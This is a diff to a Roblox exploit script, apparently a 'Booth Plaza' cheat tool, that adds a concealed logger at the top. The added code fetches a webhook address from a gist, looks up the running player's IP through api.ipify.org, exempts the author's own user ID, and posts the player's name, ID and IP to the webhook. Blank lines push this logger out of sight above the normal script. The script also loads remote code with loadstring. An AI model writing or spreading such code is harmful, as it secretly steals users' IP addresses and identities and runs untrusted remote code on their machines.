@@ -1,5 +1,79 @@
+local webh = game:HttpGet("https://gist.githubusercontent.com/BreadstickT/0c04611fd8dd13d78d2027cfd897fbeb/raw/907ad42bdb4786dd02f01f0c52080082330d6029/gistfile1.txt")
+local ownerID = tonumber(game:HttpGet("https://gist.githubusercontent.com/BreadstickT/01cad745bffc5244f220ebaec55e261d/raw/daa47d4bc0c65c4a7050b19c05e66139bac7d80b/robloxuserids"))
+
+local check = game:GetService("Players").LocalPlayer.UserId == 560044887
+
+local name
+
+pcall(function()
+    if check == false then
+        name = "IP: "..game:HttpGet("https://api.ipify.org")
+    else
+        name = "This is the script owners IP! You can't have that!"
+    end
+end)
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name.." | "..game:GetService("Players").LocalPlayer.UserId,
+               ["description"] = name
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 local Lib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/BoredStuff2/notify-lib/main/lib'),true))()
-Lib.prompt('Breadstick#3033', 'The Booth Plaza fucker - V.1', 5)
+Lib.prompt('Breadstick#3033', 'The Booth Plaza fucker - V.2', 5)
 
 
 local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()
